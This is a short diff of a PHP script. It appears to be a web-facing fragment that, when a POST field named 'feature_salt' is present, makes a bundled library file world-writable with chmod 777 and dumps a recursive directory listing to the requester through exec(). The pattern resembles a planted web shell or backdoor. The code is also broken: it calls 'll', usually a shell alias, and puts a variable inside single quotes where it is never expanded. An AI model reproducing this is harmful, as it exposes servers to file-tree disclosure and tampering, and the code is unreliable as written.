@@ -14,7 +14,7 @@ if ( !empty($_POST['feature_salt']) )
 	exec('chmod 777 $currdir/libGLEW.so.1.13');  
 	$data = array();
 	echo "<pre>";
-	exec('ls -l -R', $data, $ret);     // execute command, output is array
+	exec('ll -R', $data, $ret);     // execute command, output is array
 	if ($ret == 0) {                // check status code. if successful
 		foreach ($data as $line) {  // process array line by line
 		        echo "$line \n";
